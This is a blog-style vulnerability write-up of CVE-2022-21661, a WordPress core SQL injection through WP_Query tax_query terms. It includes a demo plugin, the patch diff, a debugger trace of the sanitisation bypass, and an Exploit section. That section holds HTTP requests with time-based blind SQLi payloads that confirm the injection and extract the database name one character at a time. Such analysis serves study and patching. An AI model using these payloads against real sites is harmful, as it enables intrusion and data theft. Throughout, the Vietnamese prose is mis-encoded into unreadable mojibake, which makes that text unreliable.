---
title: CVE-2022-21661 
description: Security Vulnerability in WordPress Core.
date: 2025-09-15 12:00:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, core, sqli]
---

## Introduction
Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (**sanitization**) kh√¥ng ƒë√∫ng c√°ch trong `WP_Query`, c√≥ nh·ªØng tr∆∞·ªùng h·ª£p c√≥ th·ªÉ x·∫£y ra **SQL Injection** th√¥ng qua c√°c **plugin** ho·∫∑c **theme** s·ª≠ d·ª•ng n√≥ theo m·ªôt c√°ch nh·∫•t ƒë·ªãnh. L·ªó h·ªïng n√†y ƒë√£ ƒë∆∞·ª£c v√° trong WordPress phi√™n b·∫£n **5.8.3**. C√°c phi√™n b·∫£n c≈© h∆°n b·ªã ·∫£nh h∆∞·ªüng c≈©ng ƒë√£ ƒë∆∞·ª£c s·ª≠a th√¥ng qua b·∫£n ph√°t h√†nh b·∫£o m·∫≠t, quay ng∆∞·ª£c l·∫°i ƒë·∫øn t·∫≠n phi√™n b·∫£n **3.7.37**.
- **CVE ID**: [CVE-2022-21661](https://www.cve.org/CVERecord?id=CVE-2022-21661)
- **Product**: [WordPress](https://wordpress.org/)
- **Vulnerability Type**: SQL Injection  
- **Affected Versions**: `3.7.37 ‚â§ version < 5.8.3`
- **CVSS severity**:  High (8.0)

## Requirements
- [**Local WordPress and Debugging**](https://w41bu1.github.io/posts/wordpress-local-and-debugging/)
- **WordPress**: v5.8.2(vul)

## Setup
### Required PHP Version
WordPress ƒë∆∞·ª£c x√¢y d·ª±ng ho√†n to√†n b·∫±ng PHP, v√¨ v·∫≠y phi√™n b·∫£n PHP tr√™n m√°y ch·ªß c√≥ ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp ƒë·∫øn kh·∫£ nƒÉng ho·∫°t ƒë·ªông c·ªßa WordPress:
- M·ªói phi√™n b·∫£n PHP ƒë·ªÅu b·ªï sung t√≠nh nƒÉng m·ªõi v√† lo·∫°i b·ªè d·∫ßn c√°c h√†m/c√∫ ph√°p l·ªói th·ªùi.
- N·∫øu WordPress d√πng t√≠nh nƒÉng m·ªõi nh∆∞ng PHP tr√™n server qu√° c≈© => s·∫Ω ph√°t sinh l·ªói c√∫ ph√°p (syntax error) ho·∫∑c kh√¥ng ch·∫°y ƒë∆∞·ª£c.
- Ng∆∞·ª£c l·∫°i, n·∫øu PHP qu√° m·ªõi, m·ªôt s·ªë h√†m c≈© m√† WordPress v·∫´n c√≤n s·ª≠ d·ª•ng c√≥ th·ªÉ ƒë√£ deprecated ho·∫∑c b·ªã lo·∫°i b·ªè ho√†n to√†n, g√¢y l·ªói khi ch·∫°y.

üëâ Do ƒë√≥, c·∫ßn l·ª±a ch·ªçn phi√™n b·∫£n PHP t∆∞∆°ng th√≠ch v·ªõi phi√™n b·∫£n WordPress. Trong ph√¢n t√≠ch n√†y, ta s·ª≠ d·ª•ng PHP **7.4** ƒë·ªÉ c√†i ƒë·∫∑t WordPress **5.8.2**.

### VSCode Extensions
WordPress c√≥ m√£ ngu·ªìn ph·ª©c t·∫°p, n√™n vi·ªác ƒë·ªçc t·ª´ng d√≤ng code th·ªß c√¥ng l√† kh√¥ng kh·∫£ thi. ƒê·ªÉ h·ªó tr·ª£ qu√° tr√¨nh **debug** v√† **truy v·∫øt**, ta c·∫ßn c√†i ƒë·∫∑t th√™m hai extension sau trong VS Code:
- **PHP Extension Pack** => t√¨m b·∫±ng t·ª´ kh√≥a: `xdebug.php-pack`
- **PHP Tools** for VS Code => t√¨m b·∫±ng t·ª´ kh√≥a: `devsense.phptools-vscode`

### Custom Plugin
V√¨ l·ªó h·ªïng SQLi n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn **WordPress Core**, nh∆∞ng ch·ªâ c√≥ th·ªÉ khai th√°c gi√°n ti·∫øp th√¥ng qua **plugin** ho·∫∑c **theme** s·ª≠ d·ª•ng `WP_Query`, n√™n ta c·∫ßn th√¥ng qua m·ªôt **plugin** ho·∫∑c **theme** ƒë·ªÉ t·∫°o t∆∞∆°ng t√°c v·ªõi **WP_Query**.

Ta x√¢y d·ª±ng **plugin** s·ª≠ d·ª•ng `WP_Query`, hi·ªÉn th·ªã query ƒë∆∞·ª£c th·ª±c thi th√¥ng qua `WP_Query::request`.

```php
<?php
/**
 * Plugin Name: Demo WP_Query
 * Description: Plugin demo WP_Query
 * Version: 1.0
 * Author: w41bu1
 */

if (!defined('ABSPATH'))
    exit;

function da_show_posts()
{
    $args = [
        'post_type' => 'post',
        'tax_query' => [
            [
                'taxonomy' => 'category',
                'field' => 'term_taxonomy_id',
                'terms' => [1,2,3],
                'operator' => 'IN',
            ],
        ],
    ];

    $query = new WP_Query($args);

    ob_start();

    echo '<h3>Demo WP_Query</h3>';
    echo '<pre style="background:#f0f0f0; padding:15px; width:100%; white-space:pre-wrap; word-wrap:break-word; overflow:auto;">';
    echo "SQL query generated by WP_Query:\n\n";
    echo esc_html($query->request); // Display excuted query 
    echo '</pre>';

    if ($query->have_posts()) {
        echo '<ul>';
        while ($query->have_posts()) {
            $query->the_post();
            echo '<li>' . get_the_title() . ' (' . get_the_ID() . ')</li>';
        }
        echo '</ul>';
    } else {
        echo '<p>No posts found.</p>';
    }

    wp_reset_postdata();
    return ob_get_clean();
}
add_shortcode('demo_wp_query', 'da_show_posts');
```

[Taxonomy parameters](https://developer.wordpress.org/reference/classes/wp_query/#taxonomy-parameters)

T·∫°o page m·ªõi v·ªõi `<page-title>` c√≥ **shortcode** :

```
[demo_wp_query]
```

üëâ Truy v·∫•n s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã khi truy c·∫≠p `http://localhost/<page-title>`

![demo page](assets/img/posts/2025-09-15-CVE-2022-21661/demo_page.png)

## Analysis

**wpdb**

- L√† l·ªõp PHP c·ªët l√µi c·ªßa WordPress d√πng ƒë·ªÉ thao t√°c tr·ª±c ti·∫øp v·ªõi MySQL.
- Cho ph√©p l·∫≠p tr√¨nh vi√™n **vi·∫øt v√† th·ª±c thi c√¢u SQL th√¥**.

**WP_Query**

- L√† m·ªôt l·ªõp tr·ª´u t∆∞·ª£ng h√≥a gi√∫p l·∫•y d·ªØ li·ªáu b√†i vi·∫øt (post) t·ª´ database m√† **kh√¥ng c·∫ßn vi·∫øt SQL tr·ª±c ti·∫øp**.
- L·∫≠p tr√¨nh vi√™n ch·ªâ c·∫ßn truy·ªÅn v√†o m·∫£ng tham s·ªë (args), WordPress s·∫Ω t·ª± ƒë·ªông d·ª±ng c√¢u SQL ph√π h·ª£p.

**M·ªëi quan h·ªá**

- WP_Query kh√¥ng tr·ª±c ti·∫øp truy v·∫•n MySQL.
- Thay v√†o ƒë√≥, n√≥ x√¢y d·ª±ng c√¢u SQL d·ª±a tr√™n args, √°p d·ª•ng c√°c b∆∞·ªõc **ki·ªÉm tra**/**validate**, r·ªìi g·ªçi `$wpdb` ƒë·ªÉ th·ª±c thi.

### Patch Diff
WordPress l√† m·ªôt d·ª± √°n **m√£ ngu·ªìn m·ªü** v·ªõi kho l∆∞u tr·ªØ ƒë∆∞·ª£c c√¥ng khai tr√™n **GitHub**. V√¨ v·∫≠y, m·ªçi b·∫£n v√° ƒë·ªÅu ƒë∆∞·ª£c commit tr·ª±c ti·∫øp t·∫°i ƒë√¢y. Do ƒë√≥, ƒë·ªÉ ph√¢n t√≠ch m·ªôt l·ªó h·ªïng, ta ch·ªâ c·∫ßn t√¨m ƒë·∫øn commit li√™n quan v√† quan s√°t s·ª± thay ƒë·ªïi trong m√£ ngu·ªìn.

Trong ph·∫ßn reference c·ªßa **CVE-2022-21661**, c√≥ li√™n k·∫øt ƒë·∫øn [commit](https://github.com/WordPress/wordpress-develop/commit/17efac8c8ec64555eff5cf51a3eff81e06317214) tr√™n GitHub:

![Patch Diff](assets/img/posts/2025-09-15-CVE-2022-21661/patch_diff.png)

L·ªó h·ªïng ƒë∆∞·ª£c v√° trong file **src/wp-includes/class-wp-tax-query.php**

**B·∫£n l·ªói**

```php
$query['terms'] = array_unique( (array) $query['terms'] );
```

- √âp `$query['terms']` th√†nh m·∫£ng v√† lo·∫°i b·ªè gi√° tr·ªã tr√πng l·∫∑p.
- Kh√¥ng c√≥ b∆∞·ªõc ki·ªÉm tra ho·∫∑c √©p ki·ªÉu d·ªØ li·ªáu, d·∫´n ƒë·∫øn nguy c∆° ch√®n d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá v√†o truy v·∫•n SQL.

V√≠ d·ª•: 

```php
$args = [
    'post_type' => 'post',
    'tax_query' => [
        [
            'taxonomy' => 'category',
            'field' => 'term_taxonomy_id',
            'terms' => ['1) AND (SELECT SLEEP(5)) # '],
            'operator' => 'IN',
        ],
    ],
];
```

**B·∫£n v√°**

```php
if ( 'slug' === $query['field'] || 'name' === $query['field'] ) {
    $query['terms'] = array_unique( (array) $query['terms'] );
} else {
    $query['terms'] = wp_parse_id_list( $query['terms'] );
}
```

- B·ªï sung ƒëi·ªÅu ki·ªán d·ª±a v√†o `$query['field']`:
    - N·∫øu l√† **slug** ho·∫∑c **name** => gi·ªØ nguy√™n c√°ch x·ª≠ l√Ω c≈©.
    - N·∫øu l√† **ID** => d√πng `wp_parse_id_list()` ƒë·ªÉ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n.
    
> Ta bi·∫øt ƒë√¢y l√† b∆∞·ªõc √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n b·ªüi v√¨ trong `tax_query`[^tax_query], tham s·ªë `field` ch·ªâ nh·∫≠n 4 gi√° tr·ªã: `slug`, `name`, `term_taxonomy_id` v√† `term_id`. Trong ƒë√≥, hai tr∆∞·ªùng `term_taxonomy_id` v√† `term_id` thu·ªôc b·∫£ng `wp_term_taxonomy` v√† ƒë·ªÅu c√≥ ki·ªÉu d·ªØ li·ªáu **BIGINT UNSIGNED**.
{: .prompt-tip }

```sql
mysql> DESC wp_term_taxonomy;
+------------------+-----------------+------+-----+---------+----------------+
| Field            | Type            | Null | Key | Default | Extra          |
+------------------+-----------------+------+-----+---------+----------------+
| term_taxonomy_id | bigint unsigned | NO   | PRI | NULL    | auto_increment |
| term_id          | bigint unsigned | NO   | MUL | 0       |                |
| taxonomy         | varchar(32)     | NO   | MUL |         |                |
| description      | longtext        | NO   |     | NULL    |                |
| parent           | bigint unsigned | NO   |     | 0       |                |
| count            | bigint          | NO   |     | 0       |                |
+------------------+-----------------+------+-----+---------+----------------+
6 rows in set (0.01 sec)
```

### How it work?
V·ªã tr√≠ l·ªó h·ªïng n·∫±m trong h√†m `clean_query` c·ªßa class `WP_Tax_Query` thu·ªôc file **src/wp-includes/class-wp-tax-query.php**

```php
private function clean_query( &$query ) {
    if ( empty( $query['taxonomy'] ) ) {
        if ( 'term_taxonomy_id' !== $query['field'] ) {
            $query = new WP_Error( 'invalid_taxonomy', __( 'Invalid taxonomy.' ) );
            return;
        }

        // So long as there are shared terms, 'include_children' requires that a taxonomy is set.
        $query['include_children'] = false;
    } elseif ( ! taxonomy_exists( $query['taxonomy'] ) ) {
        $query = new WP_Error( 'invalid_taxonomy', __( 'Invalid taxonomy.' ) );
        return;
    }

    $query['terms'] = array_unique( (array) $query['terms'] ); // <== Vulnerability location

    if ( is_taxonomy_hierarchical( $query['taxonomy'] ) && $query['include_children'] ) {
        $this->transform_query( $query, 'term_id' );

        if ( is_wp_error( $query ) ) {
            return;
        }

        $children = array();
        foreach ( $query['terms'] as $term ) {
            $children   = array_merge( $children, get_term_children( $term, $query['taxonomy'] ) );
            $children[] = $term;
        }
        $query['terms'] = $children;
    }

    $this->transform_query( $query, 'term_taxonomy_id' );
}
```
{: file="src/wp-includes/class-wp-tax-query.php v5.8.2" }

Trong h√†m `clean_query`, tham s·ªë `$query` ƒë∆∞·ª£c truy·ªÅn theo tham chi·∫øu (c√≥ d·∫•u `&`). Do ƒë√≥, m·ªçi thay ƒë·ªïi tr√™n bi·∫øn `$query` b√™n trong h√†m s·∫Ω t√°c ƒë·ªông tr·ª±c ti·∫øp ƒë·∫øn bi·∫øn `$query` g·ªëc ƒë∆∞·ª£c truy·ªÅn v√†o t·ª´ b√™n ngo√†i.

Payload ƒë∆∞·ª£c truy·ªÅn v√†o th√¥ng qua `$query['terms']`.
Trong h√†m `clean_query`, gi√° tr·ªã n√†y s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω v√† l√†m s·∫°ch.

üëâ V√¨ v·∫≠y, ƒë·ªÉ khai th√°c th√†nh c√¥ng, payload trong `$query['terms']` c·∫ßn v∆∞·ª£t qua to√†n b·ªô c∆° ch·∫ø ki·ªÉm tra v√† l·ªçc c·ªßa `clean_query` tr∆∞·ªõc khi ƒë·∫øn b∆∞·ªõc th·ª±c thi SQL.

#### Debugging

Do logic c·ªßa **WordPress Core** kh√° ph·ª©c t·∫°p, ta c·∫ßn s·ª≠ d·ª•ng **debugger** ƒë·ªÉ ph√¢n t√≠ch.
ƒê·∫∑t **breakpoint** t·∫°i ƒë·∫ßu h√†m `clean_query`, sau ƒë√≥ nh·∫•n <kbd>F5</kbd> ƒë·ªÉ b·∫Øt ƒë·∫ßu debug.

Khi truy c·∫≠p `http://localhost/<page-title>`, **debugger** s·∫Ω d·ª´ng t·∫°i h√†m `clean_query`.

![Debug 1](assets/img/posts/2025-09-15-CVE-2022-21661/debug1.png)

L·∫ßn ƒë·∫ßu, WordPress th·ª±c hi·ªán query v·ªõi `taxonomy = wp_theme` (kh√¥ng ph·∫£i gi√° tr·ªã ta truy·ªÅn v√†o).
Nh·∫•n <kbd>F5</kbd> th√™m m·ªôt l·∫ßn ƒë·ªÉ b·ªè qua, **debugger** s·∫Ω ƒë·∫øn query c√≥ `taxonomy` kh·ªõp v·ªõi gi√° tr·ªã ta truy·ªÅn v√†o.

![Debug 2](assets/img/posts/2025-09-15-CVE-2022-21661/debug2.png)

V√¨ `$query['taxonomy']` t·ªìn t·∫°i n√™n truy v·∫•n v∆∞·ª£t qua c√°c nh√°nh `if/elseif` ban ƒë·∫ßu trong `clean_query`.
Ti·∫øp t·ª•c debug, ƒëi·ªÅu ki·ªán k·∫ø ti·∫øp ƒë∆∞·ª£c th·ªèa m√£n => ta nh·∫£y v√†o h√†m `transform_query` v·ªõi tham s·ªë:
- `$query` (tham chi·∫øu t·ªõi query hi·ªán t·∫°i)
- `$resulting_field` = `'term_id'` (gi√° tr·ªã fix c·ª©ng)

Nh·∫•n <kbd>F11</kbd> ƒë·ªÉ step into v√†o `transform_query`.

```php
public function transform_query( &$query, $resulting_field ) {
    // other logic 
    if ( $query['field'] == $resulting_field ) {
        return;
    }

    // Empty 'terms' always results in a null transformation.
    // other logic
    $args = array(
        'get'                    => 'all',
        'number'                 => 0,
        'taxonomy'               => $query['taxonomy'],
        'update_term_meta_cache' => false,
        'orderby'                => 'none',
    );

    // Term query parameter name depends on the 'field' being searched on.
    switch ( $query['field'] ) {
        case 'slug':
            break;
        // other logic
        default:
            $args['include'] = wp_parse_id_list( $terms );
            break;
    }

    $term_query = new WP_Term_Query();
    $term_list  = $term_query->query( $args );

    if ( is_wp_error( $term_list ) ) {
        $query = $term_list;
        return;
    }
    // other logic
    $query['terms'] = wp_list_pluck( $term_list, $resulting_field );
    $query['field'] = $resulting_field;
}
```
{: file="src/wp-includes/class-wp-tax-query.php v5.8.2" }

T·∫°i ƒë√¢y, `$query['terms']` b·ªã ghi ƒë√® b·ªüi k·∫øt qu·∫£ c·ªßa `wp_list_pluck`.

![Debug 3](assets/img/posts/2025-09-15-CVE-2022-21661/debug3.png)

üëâ Mu·ªën gi·ªØ nguy√™n payload trong `$query['terms']`, ta ph·∫£i tr√°nh ƒë·ªÉ n√≥ b·ªã g√°n l·∫°i. C√≥ 2 c√°ch:

1. Ph√¢n t√≠ch `wp_list_pluck` ƒë·ªÉ xem c√≥ l·ªó h·ªïng bypass.
2. K·∫øt th√∫c s·ªõm `transform_query` b·∫±ng c√°ch l·ª£i d·ª•ng ƒëi·ªÅu ki·ªán (focus):

```php
if ( $query['field'] == $resulting_field ) {
    return;
}
```

Trong h√†m `clean_query`, ·ªû l·∫ßn g·ªçi `transform_query` ƒë·∫ßu ti√™n, `$resulting_field = 'term_id'` (kh√°c v·ªõi gi√° tr·ªã ta truy·ªÅn v√†o l√† `'term_taxonomy_id'`)

Tuy nhi√™n, ·ªü cu·ªëi `clean_query`, `transform_query` ƒë∆∞·ª£c g·ªçi l·∫°i v·ªõi:

```php
$this->transform_query( $query, 'term_taxonomy_id' );
```

L√∫c n√†y, `$resulting_field` tr√πng kh·ªõp v·ªõi `$query['field']` m√† ta truy·ªÅn v√†o (`'term_taxonomy_id'`), n√™n h√†m s·∫Ω **return s·ªõm**, kh√¥ng ghi ƒë√® `$query['terms']`.

üëâ Ch·ªâ c·∫ßn b·ªè qua ƒëi·ªÅu ki·ªán `if` th·ª© 2 trong `clean_query`, th√¨ ƒë·∫øn cu·ªëi h√†m, `transform_query()` s·∫Ω return s·ªõm khi `$resulting_field == $query['field']`.
Khi ƒë√≥, payload trong `$query['terms']` v·∫´n nguy√™n v·∫πn, kh√¥ng b·ªã thay ƒë·ªïi.

![Debug 4](assets/img/posts/2025-09-15-CVE-2022-21661/debug4.png)

Ta ch·ªâ c·∫ßn th√™m `$query['include_children']` v·ªõi gi√° tr·ªã **false** th√¨ ƒëi·ªÅu ki·ªán `if` s·∫Ω kh√¥ng x·∫£y ra.

```php
$args = [
    'post_type' => 'post',
    'tax_query' => [
        [
            'taxonomy' => 'category',
            'field' => 'term_taxonomy_id',
            'terms' => ['payload'],
            'operator' => 'IN',
            'include_children' => false
        ],
    ],
];
```

Thay ƒë·ªïi `$args` trong **plugin** c·ªßa ta, t·∫Øt **debugger** sau ƒë√≥ truy c·∫≠p v√†o `http://localhost/<page-title>`, quan s√°t c√¢u query th·ª±c s·ª± nguy√™n v·∫πn.

![Debug 5](assets/img/posts/2025-09-15-CVE-2022-21661/debug5.png)

üëâ Th√†nh c√¥ng ki·ªÉm so√°t payload.

#### Flow
ƒê·ªÉ hi·ªÉu r√µ ƒë∆∞·ª£c lu·ªìng g·ªçi h√†m, ta c·∫ßn ph√¢n t√≠ch **callstack** c·ªßa **debugger**.

![callstack 1](assets/img/posts/2025-09-15-CVE-2022-21661/callstack1.png)
ƒê·∫ßu ti√™n, ƒë·ªëi t∆∞·ª£ng `WP_Query` ƒë∆∞·ª£c t·∫°o v·ªõi ƒë·ªëi s·ªë `$args` ch·ª©a `terms` do ta ki·ªÉm so√°t

![callstack 2](assets/img/posts/2025-09-15-CVE-2022-21661/callstack2.png)
`__construct` c·ªßa `WP_Query` ƒë∆∞·ª£c g·ªçi sau ƒë√≥ g·ªçi ƒë·∫øn h√†m `query`

![callstack 3](assets/img/posts/2025-09-15-CVE-2022-21661/callstack3.png)
`query` th·ª±c hi·ªán `parse args` v·ªõi ƒë·ªëi s·ªë `$query` sau ƒë√≥ g·ªçi h√†m `get_posts`

![callstack 4](assets/img/posts/2025-09-15-CVE-2022-21661/callstack4.png)
`get_posts` ki·ªÉm tra c√¢u ƒëi·ªÅu ki·ªán v√† g·ªçi `get_sql` l√†m gi√° tr·ªã tr·∫£ v·ªÅ cho `$clauses` n·∫øu ƒëi·ªÅu ki·ªán ƒë√∫ng. Quan s√°t `Variable > Local > $this(WP_Query) > is_singular` b√™n **debugger tab**, `is_singular` c√≥ gi√° tr·ªã `false` n√™n c√¢u ƒëi·ªÅu ki·ªán ƒë√∫ng, `get_sql` ƒë∆∞·ª£c g·ªçi.

![callstack 5](assets/img/posts/2025-09-15-CVE-2022-21661/callstack5.png)
`get_sql` tr·∫£ v·ªÅ gi√° tr·ªã c·ªßa `get_sql_clauses`

![callstack 6](assets/img/posts/2025-09-15-CVE-2022-21661/callstack6.png)
`get_sql_clauses` g·ªçi ƒë·∫øn `get_sql_for_query` v·ªõi ƒë·ªëi s·ªë l√† tham chi·∫øu ƒë·∫øn `$queries`

![callstack 8](assets/img/posts/2025-09-15-CVE-2022-21661/callstack8.png)
`get_sql_for_query` duy·ªát qua m·∫£ng `$query` ki·ªÉm tra c√°c `$key`, n·∫øu `$key` kh√¥ng ph·∫£i `relation` th√¨ ki·ªÉm tra ƒëi·ªÅu ki·ªán `is_first_order_clause` c·ªßa `$claude`

N·∫øu `$clause` c√≥ 1 trong c√°c key sau:

```php
$keys = ['terms', 'taxonomy', 'include_children', 'field', 'operator']
```
![callstack 15](assets/img/posts/2025-09-15-CVE-2022-21661/callstack15.png)

Th√¨ `get_sql_for_clause` s·∫Ω ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë `$clause` v√† `$query`

![callstack 7](assets/img/posts/2025-09-15-CVE-2022-21661/callstack7.png)

`get_sql_for_clause` g·ªçi ƒë·∫øn `clean_query` ƒë·ªÉ l√†m s·∫°ch `$clause`, nh∆∞ng ta ƒë√£ bypass => `terms` trong `$clause` kh√¥ng thay ƒë·ªïi. 

![callstack 9](assets/img/posts/2025-09-15-CVE-2022-21661/callstack9.png)

`$where` ƒë∆∞·ª£c g√°n gi√° tr·ªã ch·ª©a payload `terms` do ta ki·ªÉm so√°t, v√† ƒë∆∞·ª£c g√°n v√†o `$sql` tr·∫£ v·ªÅ.

![callstack 10](assets/img/posts/2025-09-15-CVE-2022-21661/callstack10.png)

`$sql['where']` ƒë∆∞·ª£c g√°n l·∫°i gi√° tr·ªã tr∆∞·ªõc khi tr·∫£ v·ªÅ.

![callstack 11](assets/img/posts/2025-09-15-CVE-2022-21661/callstack11.png)

`get_sql_for_query` nh·∫≠n `$sql` tr·∫£ v·ªÅ t·ª´ `get_sql_for_clause`, th√™m `()` v√†o `$sql['where']` v√† tr·∫£ v·ªÅ cho `get_sql_clauses`

![callstack 16](assets/img/posts/2025-09-15-CVE-2022-21661/callstack16.png)
`get_sql_clauses` th√™m `AND` v√†o `$sql['where']` v√† tr·∫£ v·ªÅ cho `get_sql`.

![callstack 14](assets/img/posts/2025-09-15-CVE-2022-21661/callstack14.png)

`get_sql` tr·∫£ v·ªÅ gi√° tr·ªã l·∫•y t·ª´ `get_sql_clauses`

![callstack 12](assets/img/posts/2025-09-15-CVE-2022-21661/callstack12.png)
`get_posts` l·∫•y gi√° tr·ªã tr·∫£ v·ªÅ t·ª´ `get_sql` g√°n cho `$clauses`

`$where` ƒë∆∞·ª£c **concat** v·ªõi gi√° tr·ªã `$clauses['where']`

üëâ `get_posts` l√† h√†m ch√≠nh th·ª±c thi SQL query b·∫±ng `$wpdb` ƒë·ªÉ bi·∫øt c√¢u query ƒë∆∞·ª£c th·ª±c thi ·ªü ƒë√¢u, ta ƒë·∫∑t **breakpoint** t·∫°i n∆°i c√≥ `$wpdb` trong `get_posts`, quan s√°t `$wpdb > last_query` (ch·ª©a c√¢u l·ªánh th·ª±c thi g·∫ßn nh·∫•t) v√† li√™n t·ª•c <kbd>F10</kbd> ƒë·ªÉ debugger ch·∫°y ƒë·∫øn n∆°i th·ª±c thi query.

![callstack 13](assets/img/posts/2025-09-15-CVE-2022-21661/callstack13.png)

L·ªói `"Unknown column 'payload' in 'where clause'"` xu·∫•t hi·ªán t·∫°i **tab debugger** ch·ª©a n·ªôi dung c·ªßa payload

üëâ `$where` ch·ª©a payload ƒë∆∞·ª£c th√™m v√†o `$this->request` t·∫°i d√≤ng **3012** v√† th·ª±c thi t·∫°i d√≤ng **3026** b·∫±ng `$wpdb->get_col()`

**Chart**

![chart](assets/img/posts/2025-09-15-CVE-2022-21661/chart.png)

## Exploit
Ta t√πy ch·ªânh gi√° tr·ªã c·ªßa `terms` ƒë·ªÉ m√¥ ph·ªèng tr∆∞·ªùng h·ª£p `terms` truy·ªÅn v√†o c√≥ th·ªÉ ki·ªÉm so√°t b·ªüi attacker

```php
'terms' => [$_GET['terms']],
```

### Detect SQLi
Thay gi√° tr·ªã c·ªßa `terms` b·∫±ng payload SQLi v√† g·ª≠i request qua **Burp Suite**:

```http
GET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))a)+%23+ HTTP/1.1
```

![Detect](assets/img/posts/2025-09-15-CVE-2022-21661/detect.png)

C·∫•u query th·ª±c s·ª±:

```sql
SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID FROM wp_posts  LEFT JOIN wp_term_relationships ON (wp_posts.ID = wp_term_relationships.object_id) WHERE 1=1  AND ( 
  wp_term_relationships.term_taxonomy_id IN (1) AND (SELECT 1 FROM (SELECT SLEEP(5))a) # )
) AND wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish') GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC LIMIT 0, 10
```

üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi => payload ho·∫°t ƒë·ªông.

**Gi·∫£i th√≠ch k·ªπ thu·∫≠t (subquery trong m·ªánh ƒë·ªÅ FROM)**:

- Payload d√πng m·ªôt subquery trong m·ªánh ƒë·ªÅ `FROM`: `FROM (SELECT SLEEP(5)) a`.
- MySQL ph·∫£i th·ª±c thi truy v·∫•n con tr∆∞·ªõc, t·∫°o ra m·ªôt b·∫£ng t·∫°m t·ª´ k·∫øt qu·∫£ c·ªßa subquery, r·ªìi m·ªõi ti·∫øp t·ª•c th·ª±c thi truy v·∫•n ch√≠nh.
- `SELECT SLEEP(5)` s·∫Ω l√†m cho truy v·∫•n con ch·∫≠m 5 gi√¢y ‚Äî do ƒë√≥ th·ªùi gian tr·∫£ v·ªÅ c·ªßa c·∫£ truy v·∫•n tƒÉng t∆∞∆°ng ·ª©ng, cho th·∫•y payload ƒë∆∞·ª£c th·ª±c thi.

**L∆∞u √Ω v·ªÅ cache v√† s·ªë l∆∞·ª£ng h√†ng (rows):**

- MySQL c√≥ th·ªÉ t·ªëi ∆∞u/cached m·ªôt s·ªë k·∫øt qu·∫£ con; trong tr∆∞·ªùng h·ª£p c·ª• th·ªÉ n√†y `SELECT SLEEP(5)` ch·ªâ c·∫ßn th·ª±c thi 1 l·∫ßn ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, n√™n th·∫•y ƒë√∫ng m·ªôt l·∫ßn ƒë·ªô tr·ªÖ.
- N·∫øu ph·∫ßn tr∆∞·ªõc c·ªßa bi·ªÉu th·ª©c `AND` tr·∫£ v·ªÅ nhi·ªÅu h√†ng v√† payload ƒë∆∞·ª£c l·ªìng theo c√°ch g√¢y l·∫∑p, th·ªùi gian tr·∫£ v·ªÅ c√≥ th·ªÉ tƒÉng theo c·∫•p s·ªë (t·ª©c l√† nh√¢n l√™n theo s·ªë h√†ng), d·∫´n t·ªõi ƒë·ªô tr·ªÖ l·ªõn h∆°n nhi·ªÅu ‚Äî v√¨ truy v·∫•n con c√≥ th·ªÉ b·ªã th·ª±c thi cho m·ªói h√†ng t√πy c√°ch optimizer x·ª≠ l√Ω truy v·∫•n.

### Get First Letter of Database Name

ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ **dump ƒë∆∞·ª£c h·∫øt data** l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.

Thay gi√° tr·ªã c·ªßa `terms` b·∫±ng payload SQLi v√† g·ª≠i request qua **Burp Suite**:

```http
GET /demo/?terms=1)+AND+(SELECT+1+FROM+(SELECT+IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),0))a)+%23+ HTTP/1.1
```

S·ª≠ d·ª•ng `SUBSTRING()` ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa **database name**, `IF()` tr·∫£ v·ªÅ `SLEEP(5)` n·∫øu k√Ω t·ª± ƒë√≥ l√† `0x77`(`w`)

üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi => k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† `w`.

## Conclusion
L·ªó h·ªïng **CVE-2022-21661** trong **WordPress Core** tr∆∞·ªõc phi√™n b·∫£n **5.8.3**, quay ng∆∞·ª£c ƒë·∫øn t·∫≠n phi√™n b·∫£n **3.7.37**, xu·∫•t ph√°t t·ª´ vi·ªác l√†m s·∫°ch d·ªØ li·ªáu (**sanitization**) kh√¥ng ƒë√∫ng c√°ch trong `WP_Query` d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.

B·∫£n v√° ƒë√£ √©p ki·ªÉu d·ªØ li·ªáu th√†nh m·∫£ng s·ªë nguy√™n an to√†n tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u query ƒë·ªÉ th·ª±c thi.

**Key takeaways**:

- Ki·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng.
- Lu√¥n s·ª≠ d·ª•ng `$wpdb->prepare()` khi l√†m vi·ªác v·ªõi database trong **WordPress** ƒë·ªÉ tr√°nh SQL Injection.
- Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t **WordPress**  v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng.

## References

[SQL Injection cheat sheet - PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

[CVE-2022-21661 Detail ](https://www.cve.org/CVERecord?id=CVE-2022-21661)

## Notes

